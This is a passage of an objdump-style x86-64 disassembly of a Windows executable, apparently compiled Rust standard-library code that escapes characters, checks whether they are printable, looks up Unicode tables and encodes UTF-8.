   1400042ee:	4d 39 c2             	cmp    %r8,%r10
   1400042f1:	4a 8d 7c 08 03       	lea    0x3(%rax,%r9,1),%rdi
   1400042f6:	48 0f 43 fe          	cmovae %rsi,%rdi
   1400042fa:	80 3f bf             	cmpb   $0xbf,(%rdi)
   1400042fd:	0f 8e d4 fe ff ff    	jle    0x1400041d7
   140004303:	4e 8d 1c 10          	lea    (%rax,%r10,1),%r11
   140004307:	4d 29 d0             	sub    %r10,%r8
   14000430a:	4c 89 1a             	mov    %r11,(%rdx)
   14000430d:	4c 89 42 08          	mov    %r8,0x8(%rdx)
   140004311:	4d 29 ca             	sub    %r9,%r10
   140004314:	48 89 01             	mov    %rax,(%rcx)
   140004317:	4c 01 c8             	add    %r9,%rax
   14000431a:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   14000431e:	48 89 41 10          	mov    %rax,0x10(%rcx)
   140004322:	4c 89 51 18          	mov    %r10,0x18(%rcx)
   140004326:	eb 07                	jmp    0x14000432f
   140004328:	48 c7 01 00 00 00 00 	movq   $0x0,(%rcx)
   14000432f:	5b                   	pop    %rbx
   140004330:	5d                   	pop    %rbp
   140004331:	5f                   	pop    %rdi
   140004332:	5e                   	pop    %rsi
   140004333:	c3                   	ret
   140004334:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000433b:	00 00 00 00 00 
   140004340:	55                   	push   %rbp
   140004341:	56                   	push   %rsi
   140004342:	57                   	push   %rdi
   140004343:	48 83 ec 40          	sub    $0x40,%rsp
   140004347:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000434c:	89 d6                	mov    %edx,%esi
   14000434e:	83 fa 27             	cmp    $0x27,%edx
   140004351:	77 1c                	ja     0x14000436f
   140004353:	89 f0                	mov    %esi,%eax
   140004355:	48 8d 15 d4 0c 04 00 	lea    0x40cd4(%rip),%rdx        # 0x140045030
   14000435c:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   140004360:	48 01 d0             	add    %rdx,%rax
   140004363:	ff e0                	jmp    *%rax
   140004365:	66 c7 01 5c 30       	movw   $0x305c,(%rcx)
   14000436a:	e9 02 02 00 00       	jmp    0x140004571
   14000436f:	83 fe 5c             	cmp    $0x5c,%esi
   140004372:	75 0a                	jne    0x14000437e
   140004374:	66 c7 01 5c 5c       	movw   $0x5c5c,(%rcx)
   140004379:	e9 f3 01 00 00       	jmp    0x140004571
   14000437e:	81 fe 00 03 00 00    	cmp    $0x300,%esi
   140004384:	0f 93 c0             	setae  %al
   140004387:	41 84 c0             	test   %al,%r8b
   14000438a:	0f 84 0d 01 00 00    	je     0x14000449d
   140004390:	48 89 cf             	mov    %rcx,%rdi
   140004393:	89 f1                	mov    %esi,%ecx
   140004395:	e8 46 03 00 00       	call   0x1400046e0
   14000439a:	48 89 f9             	mov    %rdi,%rcx
   14000439d:	84 c0                	test   %al,%al
   14000439f:	0f 84 f8 00 00 00    	je     0x14000449d
   1400043a5:	89 f0                	mov    %esi,%eax
   1400043a7:	83 c8 01             	or     $0x1,%eax
   1400043aa:	0f bd d0             	bsr    %eax,%edx
   1400043ad:	83 f2 1c             	xor    $0x1c,%edx
   1400043b0:	c1 ea 02             	shr    $0x2,%edx
   1400043b3:	48 8d 42 fe          	lea    -0x2(%rdx),%rax
   1400043b7:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   1400043bb:	66 c7 45 f6 00 00    	movw   $0x0,-0xa(%rbp)
   1400043c1:	41 89 f1             	mov    %esi,%r9d
   1400043c4:	41 c1 e9 14          	shr    $0x14,%r9d
   1400043c8:	4c 8d 05 41 3a 86 00 	lea    0x863a41(%rip),%r8        # 0x140867e10
   1400043cf:	47 0f b6 0c 01       	movzbl (%r9,%r8,1),%r9d
   1400043d4:	44 88 4d f9          	mov    %r9b,-0x7(%rbp)
   1400043d8:	41 89 f1             	mov    %esi,%r9d
   1400043db:	41 c1 e9 10          	shr    $0x10,%r9d
   1400043df:	41 83 e1 0f          	and    $0xf,%r9d
   1400043e3:	47 0f b6 0c 01       	movzbl (%r9,%r8,1),%r9d
   1400043e8:	44 88 4d fa          	mov    %r9b,-0x6(%rbp)
   1400043ec:	41 89 f1             	mov    %esi,%r9d
   1400043ef:	41 c1 e9 0c          	shr    $0xc,%r9d
   1400043f3:	41 83 e1 0f          	and    $0xf,%r9d
   1400043f7:	47 0f b6 0c 01       	movzbl (%r9,%r8,1),%r9d
   1400043fc:	44 88 4d fb          	mov    %r9b,-0x5(%rbp)
   140004400:	41 89 f1             	mov    %esi,%r9d
   140004403:	41 c1 e9 08          	shr    $0x8,%r9d
   140004407:	41 83 e1 0f          	and    $0xf,%r9d
   14000440b:	47 0f b6 0c 01       	movzbl (%r9,%r8,1),%r9d
   140004410:	44 88 4d fc          	mov    %r9b,-0x4(%rbp)
   140004414:	41 89 f1             	mov    %esi,%r9d
   140004417:	41 c1 e9 04          	shr    $0x4,%r9d
   14000441b:	41 83 e1 0f          	and    $0xf,%r9d
   14000441f:	47 0f b6 0c 01       	movzbl (%r9,%r8,1),%r9d
   140004424:	44 88 4d fd          	mov    %r9b,-0x3(%rbp)
   140004428:	83 e6 0f             	and    $0xf,%esi
   14000442b:	46 0f b6 04 06       	movzbl (%rsi,%r8,1),%r8d
   140004430:	44 88 45 fe          	mov    %r8b,-0x2(%rbp)
   140004434:	c6 45 ff 7d          	movb   $0x7d,-0x1(%rbp)
   140004438:	66 c7 44 15 f4 5c 75 	movw   $0x755c,-0xc(%rbp,%rdx,1)
   14000443f:	c6 44 15 f6 7b       	movb   $0x7b,-0xa(%rbp,%rdx,1)
   140004444:	0f b7 55 fe          	movzwl -0x2(%rbp),%edx
   140004448:	66 89 51 08          	mov    %dx,0x8(%rcx)
   14000444c:	48 8b 55 f6          	mov    -0xa(%rbp),%rdx
   140004450:	48 89 11             	mov    %rdx,(%rcx)
   140004453:	e9 10 01 00 00       	jmp    0x140004568
   140004458:	66 c7 01 5c 6e       	movw   $0x6e5c,(%rcx)
   14000445d:	e9 0f 01 00 00       	jmp    0x140004571
   140004462:	41 f7 c0 00 01 00 00 	test   $0x100,%r8d
   140004469:	74 32                	je     0x14000449d
   14000446b:	66 c7 01 5c 27       	movw   $0x275c,(%rcx)
   140004470:	e9 fc 00 00 00       	jmp    0x140004571
   140004475:	66 c7 01 5c 72       	movw   $0x725c,(%rcx)
   14000447a:	e9 f2 00 00 00       	jmp    0x140004571
   14000447f:	66 c7 01 5c 74       	movw   $0x745c,(%rcx)
   140004484:	e9 e8 00 00 00       	jmp    0x140004571
   140004489:	41 81 e0 ff ff ff 00 	and    $0xffffff,%r8d
   140004490:	41 81 f8 00 00 01 00 	cmp    $0x10000,%r8d
   140004497:	0f 83 cf 00 00 00    	jae    0x14000456c
   14000449d:	48 89 cf             	mov    %rcx,%rdi
   1400044a0:	89 f1                	mov    %esi,%ecx
   1400044a2:	e8 e9 00 00 00       	call   0x140004590
   1400044a7:	84 c0                	test   %al,%al
   1400044a9:	74 0e                	je     0x1400044b9
   1400044ab:	48 89 f9             	mov    %rdi,%rcx
   1400044ae:	89 37                	mov    %esi,(%rdi)
   1400044b0:	b2 81                	mov    $0x81,%dl
   1400044b2:	b0 80                	mov    $0x80,%al
   1400044b4:	e9 c4 00 00 00       	jmp    0x14000457d
   1400044b9:	89 f0                	mov    %esi,%eax
   1400044bb:	83 c8 01             	or     $0x1,%eax
   1400044be:	0f bd c8             	bsr    %eax,%ecx
   1400044c1:	83 f1 1c             	xor    $0x1c,%ecx
   1400044c4:	c1 e9 02             	shr    $0x2,%ecx
   1400044c7:	48 8d 41 fe          	lea    -0x2(%rcx),%rax
   1400044cb:	c6 45 ee 00          	movb   $0x0,-0x12(%rbp)
   1400044cf:	66 c7 45 ec 00 00    	movw   $0x0,-0x14(%rbp)
   1400044d5:	41 89 f0             	mov    %esi,%r8d
   1400044d8:	41 c1 e8 14          	shr    $0x14,%r8d
   1400044dc:	48 8d 15 2d 39 86 00 	lea    0x86392d(%rip),%rdx        # 0x140867e10
   1400044e3:	45 0f b6 04 10       	movzbl (%r8,%rdx,1),%r8d
   1400044e8:	44 88 45 ef          	mov    %r8b,-0x11(%rbp)
   1400044ec:	41 89 f0             	mov    %esi,%r8d
   1400044ef:	41 c1 e8 10          	shr    $0x10,%r8d
   1400044f3:	41 83 e0 0f          	and    $0xf,%r8d
   1400044f7:	45 0f b6 04 10       	movzbl (%r8,%rdx,1),%r8d
   1400044fc:	44 88 45 f0          	mov    %r8b,-0x10(%rbp)
   140004500:	41 89 f0             	mov    %esi,%r8d
   140004503:	41 c1 e8 0c          	shr    $0xc,%r8d
   140004507:	41 83 e0 0f          	and    $0xf,%r8d
   14000450b:	45 0f b6 04 10       	movzbl (%r8,%rdx,1),%r8d
   140004510:	44 88 45 f1          	mov    %r8b,-0xf(%rbp)
   140004514:	41 89 f0             	mov    %esi,%r8d
   140004517:	41 c1 e8 08          	shr    $0x8,%r8d
   14000451b:	41 83 e0 0f          	and    $0xf,%r8d
   14000451f:	45 0f b6 04 10       	movzbl (%r8,%rdx,1),%r8d
   140004524:	44 88 45 f2          	mov    %r8b,-0xe(%rbp)
   140004528:	41 89 f0             	mov    %esi,%r8d
   14000452b:	41 c1 e8 04          	shr    $0x4,%r8d
   14000452f:	41 83 e0 0f          	and    $0xf,%r8d
   140004533:	45 0f b6 04 10       	movzbl (%r8,%rdx,1),%r8d
   140004538:	44 88 45 f3          	mov    %r8b,-0xd(%rbp)
   14000453c:	83 e6 0f             	and    $0xf,%esi
   14000453f:	0f b6 14 16          	movzbl (%rsi,%rdx,1),%edx
   140004543:	88 55 f4             	mov    %dl,-0xc(%rbp)
   140004546:	c6 45 f5 7d          	movb   $0x7d,-0xb(%rbp)
   14000454a:	66 c7 44 0d ea 5c 75 	movw   $0x755c,-0x16(%rbp,%rcx,1)
   140004551:	c6 44 0d ec 7b       	movb   $0x7b,-0x14(%rbp,%rcx,1)
   140004556:	0f b7 55 f4          	movzwl -0xc(%rbp),%edx
   14000455a:	48 89 f9             	mov    %rdi,%rcx
   14000455d:	66 89 57 08          	mov    %dx,0x8(%rdi)
   140004561:	48 8b 55 ec          	mov    -0x14(%rbp),%rdx
   140004565:	48 89 17             	mov    %rdx,(%rdi)
   140004568:	b2 0a                	mov    $0xa,%dl
   14000456a:	eb 11                	jmp    0x14000457d
   14000456c:	66 c7 01 5c 22       	movw   $0x225c,(%rcx)
   140004571:	48 c7 41 02 00 00 00 	movq   $0x0,0x2(%rcx)
   140004578:	00 
   140004579:	b2 02                	mov    $0x2,%dl
   14000457b:	31 c0                	xor    %eax,%eax
   14000457d:	88 41 0c             	mov    %al,0xc(%rcx)
   140004580:	88 51 0d             	mov    %dl,0xd(%rcx)
   140004583:	48 83 c4 40          	add    $0x40,%rsp
   140004587:	5f                   	pop    %rdi
   140004588:	5e                   	pop    %rsi
   140004589:	5d                   	pop    %rbp
   14000458a:	c3                   	ret
   14000458b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004590:	55                   	push   %rbp
   140004591:	48 83 ec 40          	sub    $0x40,%rsp
   140004595:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000459a:	83 f9 20             	cmp    $0x20,%ecx
   14000459d:	73 04                	jae    0x1400045a3
   14000459f:	31 c0                	xor    %eax,%eax
   1400045a1:	eb 07                	jmp    0x1400045aa
   1400045a3:	b0 01                	mov    $0x1,%al
   1400045a5:	83 f9 7f             	cmp    $0x7f,%ecx
   1400045a8:	73 06                	jae    0x1400045b0
   1400045aa:	48 83 c4 40          	add    $0x40,%rsp
   1400045ae:	5d                   	pop    %rbp
   1400045af:	c3                   	ret
   1400045b0:	81 f9 00 00 01 00    	cmp    $0x10000,%ecx
   1400045b6:	73 34                	jae    0x1400045ec
   1400045b8:	48 8d 05 49 28 86 00 	lea    0x862849(%rip),%rax        # 0x140866e08
   1400045bf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400045c4:	48 c7 44 24 30 29 01 	movq   $0x129,0x30(%rsp)
   1400045cb:	00 00 
   1400045cd:	48 c7 44 24 20 22 01 	movq   $0x122,0x20(%rsp)
   1400045d4:	00 00 
   1400045d6:	48 8d 15 b9 26 86 00 	lea    0x8626b9(%rip),%rdx        # 0x140866c96
   1400045dd:	4c 8d 0d 02 27 86 00 	lea    0x862702(%rip),%r9        # 0x140866ce6
   1400045e4:	41 b8 28 00 00 00    	mov    $0x28,%r8d
   1400045ea:	eb 3a                	jmp    0x140004626
   1400045ec:	81 f9 00 00 02 00    	cmp    $0x20000,%ecx
   1400045f2:	73 3c                	jae    0x140004630
   1400045f4:	48 8d 05 b5 24 86 00 	lea    0x8624b5(%rip),%rax        # 0x140866ab0
   1400045fb:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004600:	48 c7 44 24 30 e6 01 	movq   $0x1e6,0x30(%rsp)
   140004607:	00 00 
   140004609:	48 c7 44 24 20 d0 00 	movq   $0xd0,0x20(%rsp)
   140004610:	00 00 
   140004612:	48 8d 15 6f 23 86 00 	lea    0x86236f(%rip),%rdx        # 0x140866988
   140004619:	4c 8d 0d c0 23 86 00 	lea    0x8623c0(%rip),%r9        # 0x1408669e0
   140004620:	41 b8 2c 00 00 00    	mov    $0x2c,%r8d
   140004626:	e8 b5 01 00 00       	call   0x1400047e0
   14000462b:	e9 7a ff ff ff       	jmp    0x1400045aa
   140004630:	89 c8                	mov    %ecx,%eax
   140004632:	25 e0 ff 1f 00       	and    $0x1fffe0,%eax
   140004637:	3d e0 a6 02 00       	cmp    $0x2a6e0,%eax
   14000463c:	0f 95 c0             	setne  %al
   14000463f:	8d 91 c0 48 fd ff    	lea    -0x2b740(%rcx),%edx
   140004645:	83 fa fa             	cmp    $0xfffffffa,%edx
   140004648:	0f 92 c2             	setb   %dl
   14000464b:	41 89 c8             	mov    %ecx,%r8d
   14000464e:	41 81 e0 fe ff 1f 00 	and    $0x1ffffe,%r8d
   140004655:	41 81 f8 1e b8 02 00 	cmp    $0x2b81e,%r8d
   14000465c:	41 0f 95 c0          	setne  %r8b
   140004660:	41 20 c0             	and    %al,%r8b
   140004663:	8d 81 50 31 fd ff    	lea    -0x2ceb0(%rcx),%eax
   140004669:	83 f8 f2             	cmp    $0xfffffff2,%eax
   14000466c:	0f 92 c0             	setb   %al
   14000466f:	20 d0                	and    %dl,%al
   140004671:	44 20 c0             	and    %r8b,%al
   140004674:	8d 91 10 14 fd ff    	lea    -0x2ebf0(%rcx),%edx
   14000467a:	83 fa f1             	cmp    $0xfffffff1,%edx
   14000467d:	0f 92 c2             	setb   %dl
   140004680:	44 8d 81 00 08 fd ff 	lea    -0x2f800(%rcx),%r8d
   140004687:	41 81 f8 5e f6 ff ff 	cmp    $0xfffff65e,%r8d
   14000468e:	41 0f 92 c0          	setb   %r8b
   140004692:	41 20 d0             	and    %dl,%r8b
   140004695:	8d 91 00 00 fd ff    	lea    -0x30000(%rcx),%edx
   14000469b:	81 fa 1e fa ff ff    	cmp    $0xfffffa1e,%edx
   1400046a1:	0f 92 c2             	setb   %dl
   1400046a4:	44 20 c2             	and    %r8b,%dl
   1400046a7:	20 c2                	and    %al,%dl
   1400046a9:	8d 81 b0 ec fc ff    	lea    -0x31350(%rcx),%eax
   1400046af:	83 f8 fb             	cmp    $0xfffffffb,%eax
   1400046b2:	0f 92 c0             	setb   %al
   1400046b5:	44 8d 81 00 ff f1 ff 	lea    -0xe0100(%rcx),%r8d
   1400046bc:	41 81 f8 b0 22 f5 ff 	cmp    $0xfff522b0,%r8d
   1400046c3:	41 0f 92 c0          	setb   %r8b
   1400046c7:	41 20 c0             	and    %al,%r8b
   1400046ca:	81 f9 f0 01 0e 00    	cmp    $0xe01f0,%ecx
   1400046d0:	0f 92 c0             	setb   %al
   1400046d3:	44 20 c0             	and    %r8b,%al
   1400046d6:	20 d0                	and    %dl,%al
   1400046d8:	e9 cd fe ff ff       	jmp    0x1400045aa
   1400046dd:	0f 1f 00             	nopl   (%rax)
   1400046e0:	89 c8                	mov    %ecx,%eax
   1400046e2:	c1 e0 0b             	shl    $0xb,%eax
   1400046e5:	31 d2                	xor    %edx,%edx
   1400046e7:	81 f9 2f 18 01 00    	cmp    $0x1182f,%ecx
   1400046ed:	41 b9 11 00 00 00    	mov    $0x11,%r9d
   1400046f3:	4c 0f 42 ca          	cmovb  %rdx,%r9
   1400046f7:	4d 8d 51 08          	lea    0x8(%r9),%r10
   1400046fb:	4c 8d 05 7e 29 86 00 	lea    0x86297e(%rip),%r8        # 0x140867080
   140004702:	47 8b 5c 88 20       	mov    0x20(%r8,%r9,4),%r11d
   140004707:	41 c1 e3 0b          	shl    $0xb,%r11d
   14000470b:	41 39 c3             	cmp    %eax,%r11d
   14000470e:	4d 0f 47 d1          	cmova  %r9,%r10
   140004712:	4d 8d 4a 04          	lea    0x4(%r10),%r9
   140004716:	47 8b 5c 90 10       	mov    0x10(%r8,%r10,4),%r11d
   14000471b:	41 c1 e3 0b          	shl    $0xb,%r11d
   14000471f:	41 39 c3             	cmp    %eax,%r11d
   140004722:	4d 0f 47 ca          	cmova  %r10,%r9
   140004726:	4d 8d 51 02          	lea    0x2(%r9),%r10
   14000472a:	47 8b 5c 88 08       	mov    0x8(%r8,%r9,4),%r11d
   14000472f:	41 c1 e3 0b          	shl    $0xb,%r11d
   140004733:	41 39 c3             	cmp    %eax,%r11d
   140004736:	4d 0f 47 d1          	cmova  %r9,%r10
   14000473a:	4d 8d 4a 01          	lea    0x1(%r10),%r9
   14000473e:	47 8b 5c 90 04       	mov    0x4(%r8,%r10,4),%r11d
   140004743:	41 c1 e3 0b          	shl    $0xb,%r11d
   140004747:	41 39 c3             	cmp    %eax,%r11d
   14000474a:	4d 0f 47 ca          	cmova  %r10,%r9
   14000474e:	4d 8d 59 01          	lea    0x1(%r9),%r11
   140004752:	47 8b 54 88 04       	mov    0x4(%r8,%r9,4),%r10d
   140004757:	41 c1 e2 0b          	shl    $0xb,%r10d
   14000475b:	41 39 c2             	cmp    %eax,%r10d
   14000475e:	4d 0f 47 d9          	cmova  %r9,%r11
   140004762:	47 8b 0c 98          	mov    (%r8,%r11,4),%r9d
   140004766:	41 c1 e1 0b          	shl    $0xb,%r9d
   14000476a:	45 31 d2             	xor    %r10d,%r10d
   14000476d:	41 39 c1             	cmp    %eax,%r9d
   140004770:	41 0f 94 c2          	sete   %r10b
   140004774:	4d 11 da             	adc    %r11,%r10
   140004777:	43 8b 04 90          	mov    (%r8,%r10,4),%eax
   14000477b:	c1 e8 15             	shr    $0x15,%eax
   14000477e:	41 b9 ef 02 00 00    	mov    $0x2ef,%r9d
   140004784:	49 83 fa 20          	cmp    $0x20,%r10
   140004788:	77 0e                	ja     0x140004798
   14000478a:	47 8b 4c 90 04       	mov    0x4(%r8,%r10,4),%r9d
   14000478f:	41 c1 e9 15          	shr    $0x15,%r9d
   140004793:	4d 85 d2             	test   %r10,%r10
   140004796:	74 0a                	je     0x1400047a2
   140004798:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   14000479d:	43 23 54 90 fc       	and    -0x4(%r8,%r10,4),%edx
   1400047a2:	49 89 c0             	mov    %rax,%r8
   1400047a5:	49 f7 d0             	not    %r8
   1400047a8:	4d 01 c8             	add    %r9,%r8
   1400047ab:	74 2b                	je     0x1400047d8
   1400047ad:	29 d1                	sub    %edx,%ecx
   1400047af:	49 ff c9             	dec    %r9
   1400047b2:	45 31 c0             	xor    %r8d,%r8d
   1400047b5:	48 8d 15 04 18 86 00 	lea    0x861804(%rip),%rdx        # 0x140865fc0
   1400047bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400047c0:	45 89 c2             	mov    %r8d,%r10d
   1400047c3:	44 0f b6 04 10       	movzbl (%rax,%rdx,1),%r8d
   1400047c8:	45 01 d0             	add    %r10d,%r8d
   1400047cb:	41 39 c8             	cmp    %ecx,%r8d
   1400047ce:	77 08                	ja     0x1400047d8
   1400047d0:	48 ff c0             	inc    %rax
   1400047d3:	49 39 c1             	cmp    %rax,%r9
   1400047d6:	75 e8                	jne    0x1400047c0
   1400047d8:	24 01                	and    $0x1,%al
   1400047da:	c3                   	ret
   1400047db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400047e0:	55                   	push   %rbp
   1400047e1:	41 57                	push   %r15
   1400047e3:	41 56                	push   %r14
   1400047e5:	41 54                	push   %r12
   1400047e7:	56                   	push   %rsi
   1400047e8:	57                   	push   %rdi
   1400047e9:	53                   	push   %rbx
   1400047ea:	48 83 ec 20          	sub    $0x20,%rsp
   1400047ee:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400047f3:	48 89 d0             	mov    %rdx,%rax
   1400047f6:	48 8b 75 70          	mov    0x70(%rbp),%rsi
   1400047fa:	48 8b 7d 68          	mov    0x68(%rbp),%rdi
   1400047fe:	48 8b 55 60          	mov    0x60(%rbp),%rdx
   140004802:	89 cb                	mov    %ecx,%ebx
   140004804:	c1 eb 08             	shr    $0x8,%ebx
   140004807:	4e 8d 04 40          	lea    (%rax,%r8,2),%r8
   14000480b:	45 31 db             	xor    %r11d,%r11d
   14000480e:	49 89 c7             	mov    %rax,%r15
   140004811:	44 0f b6 70 01       	movzbl 0x1(%rax),%r14d
   140004816:	48 83 c0 02          	add    $0x2,%rax
   14000481a:	4f 8d 14 33          	lea    (%r11,%r14,1),%r10
   14000481e:	41 38 1f             	cmp    %bl,(%r15)
   140004821:	75 3d                	jne    0x140004860
   140004823:	4d 39 da             	cmp    %r11,%r10
   140004826:	0f 82 ab 00 00 00    	jb     0x1400048d7
   14000482c:	49 39 d2             	cmp    %rdx,%r10
   14000482f:	0f 87 b4 00 00 00    	ja     0x1400048e9
   140004835:	4d 01 cb             	add    %r9,%r11
   140004838:	45 31 ff             	xor    %r15d,%r15d
   14000483b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004840:	4d 39 fe             	cmp    %r15,%r14
   140004843:	74 1d                	je     0x140004862
   140004845:	4d 8d 67 01          	lea    0x1(%r15),%r12
   140004849:	43 38 0c 3b          	cmp    %cl,(%r11,%r15,1)
   14000484d:	4d 89 e7             	mov    %r12,%r15
   140004850:	75 ee                	jne    0x140004840
   140004852:	eb 70                	jmp    0x1400048c4
   140004854:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000485b:	00 00 00 00 00 
   140004860:	77 08                	ja     0x14000486a
   140004862:	4d 89 d3             	mov    %r10,%r11
   140004865:	4c 39 c0             	cmp    %r8,%rax
   140004868:	75 a4                	jne    0x14000480e
   14000486a:	48 01 fe             	add    %rdi,%rsi
   14000486d:	0f b7 c9             	movzwl %cx,%ecx
   140004870:	b0 01                	mov    $0x1,%al
   140004872:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004879:	1f 84 00 00 00 00 00 
   140004880:	4c 8d 47 01          	lea    0x1(%rdi),%r8
   140004884:	0f be 17             	movsbl (%rdi),%edx
   140004887:	85 d2                	test   %edx,%edx
   140004889:	78 15                	js     0x1400048a0
   14000488b:	4c 89 c7             	mov    %r8,%rdi
   14000488e:	29 d1                	sub    %edx,%ecx
   140004890:	79 29                	jns    0x1400048bb
   140004892:	eb 32                	jmp    0x1400048c6
   140004894:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000489b:	00 00 00 00 00 
   1400048a0:	49 39 f0             	cmp    %rsi,%r8
   1400048a3:	74 53                	je     0x1400048f8
   1400048a5:	44 0f b6 47 01       	movzbl 0x1(%rdi),%r8d
   1400048aa:	48 83 c7 02          	add    $0x2,%rdi
   1400048ae:	83 e2 7f             	and    $0x7f,%edx
   1400048b1:	c1 e2 08             	shl    $0x8,%edx
   1400048b4:	44 09 c2             	or     %r8d,%edx
   1400048b7:	29 d1                	sub    %edx,%ecx
   1400048b9:	78 0b                	js     0x1400048c6
   1400048bb:	34 01                	xor    $0x1,%al
   1400048bd:	48 39 f7             	cmp    %rsi,%rdi
   1400048c0:	75 be                	jne    0x140004880
   1400048c2:	eb 02                	jmp    0x1400048c6
   1400048c4:	31 c0                	xor    %eax,%eax
   1400048c6:	24 01                	and    $0x1,%al
   1400048c8:	48 83 c4 20          	add    $0x20,%rsp
   1400048cc:	5b                   	pop    %rbx
   1400048cd:	5f                   	pop    %rdi
   1400048ce:	5e                   	pop    %rsi
   1400048cf:	41 5c                	pop    %r12
   1400048d1:	41 5e                	pop    %r14
   1400048d3:	41 5f                	pop    %r15
   1400048d5:	5d                   	pop    %rbp
   1400048d6:	c3                   	ret
   1400048d7:	4c 8d 05 92 20 86 00 	lea    0x862092(%rip),%r8        # 0x140866970
   1400048de:	4c 89 d9             	mov    %r11,%rcx
   1400048e1:	4c 89 d2             	mov    %r10,%rdx
   1400048e4:	e8 27 00 00 00       	call   0x140004910
   1400048e9:	4c 8d 05 80 20 86 00 	lea    0x862080(%rip),%r8        # 0x140866970
   1400048f0:	4c 89 d1             	mov    %r10,%rcx
   1400048f3:	e8 f8 ef ff ff       	call   0x1400038f0
   1400048f8:	48 8d 0d 59 20 86 00 	lea    0x862059(%rip),%rcx        # 0x140866958
   1400048ff:	e8 1c 00 00 00       	call   0x140004920
   140004904:	cc                   	int3
   140004905:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000490c:	00 00 00 00 
   140004910:	55                   	push   %rbp
   140004911:	48 83 ec 20          	sub    $0x20,%rsp
   140004915:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000491a:	e8 21 00 00 00       	call   0x140004940
   14000491f:	cc                   	int3
   140004920:	55                   	push   %rbp
   140004921:	48 83 ec 20          	sub    $0x20,%rsp
   140004925:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000492a:	49 89 c8             	mov    %rcx,%r8
   14000492d:	48 8d 0d 93 19 86 00 	lea    0x861993(%rip),%rcx        # 0x1408662c7
   140004934:	ba 2b 00 00 00       	mov    $0x2b,%edx
   140004939:	e8 32 f2 ff ff       	call   0x140003b70
   14000493e:	cc                   	int3
   14000493f:	90                   	nop
   140004940:	55                   	push   %rbp
   140004941:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140004948:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
   14000494f:	00 
   140004950:	48 89 4d f8          	mov    %rcx,-0x8(%rbp)
   140004954:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140004958:	48 8d 45 f8          	lea    -0x8(%rbp),%rax
   14000495c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140004960:	48 8d 05 c9 e8 ff ff 	lea    -0x1737(%rip),%rax        # 0x140003230
   140004967:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000496b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   14000496f:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
   140004973:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004977:	48 8d 05 e2 26 86 00 	lea    0x8626e2(%rip),%rax        # 0x140867060
   14000497e:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140004982:	48 c7 45 a8 02 00 00 	movq   $0x2,-0x58(%rbp)
   140004989:	00 
   14000498a:	48 c7 45 c0 00 00 00 	movq   $0x0,-0x40(%rbp)
   140004991:	00 
   140004992:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   140004996:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   14000499a:	48 c7 45 b8 02 00 00 	movq   $0x2,-0x48(%rbp)
   1400049a1:	00 
   1400049a2:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   1400049a6:	4c 89 c2             	mov    %r8,%rdx
   1400049a9:	e8 a2 e9 ff ff       	call   0x140003350
   1400049ae:	cc                   	int3
   1400049af:	90                   	nop
   1400049b0:	55                   	push   %rbp
   1400049b1:	48 83 ec 30          	sub    $0x30,%rsp
   1400049b5:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400049ba:	f6 42 13 18          	testb  $0x18,0x13(%rdx)
   1400049be:	8b 01                	mov    (%rcx),%eax
   1400049c0:	74 1c                	je     0x1400049de
   1400049c2:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   1400049c9:	3d 80 00 00 00       	cmp    $0x80,%eax
   1400049ce:	73 23                	jae    0x1400049f3
   1400049d0:	88 45 fc             	mov    %al,-0x4(%rbp)
   1400049d3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400049d9:	e9 95 00 00 00       	jmp    0x140004a73
   1400049de:	48 8b 0a             	mov    (%rdx),%rcx
   1400049e1:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   1400049e5:	4c 8b 42 20          	mov    0x20(%rdx),%r8
   1400049e9:	89 c2                	mov    %eax,%edx
   1400049eb:	48 83 c4 30          	add    $0x30,%rsp
   1400049ef:	5d                   	pop    %rbp
   1400049f0:	49 ff e0             	rex.WB jmp *%r8
   1400049f3:	89 c1                	mov    %eax,%ecx
   1400049f5:	3d 00 08 00 00       	cmp    $0x800,%eax
   1400049fa:	73 18                	jae    0x140004a14
   1400049fc:	c1 e9 06             	shr    $0x6,%ecx
   1400049ff:	80 c9 c0             	or     $0xc0,%cl
   140004a02:	88 4d fc             	mov    %cl,-0x4(%rbp)
   140004a05:	24 3f                	and    $0x3f,%al
   140004a07:	0c 80                	or     $0x80,%al
   140004a09:	88 45 fd             	mov    %al,-0x3(%rbp)
   140004a0c:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140004a12:	eb 5f                	jmp    0x140004a73
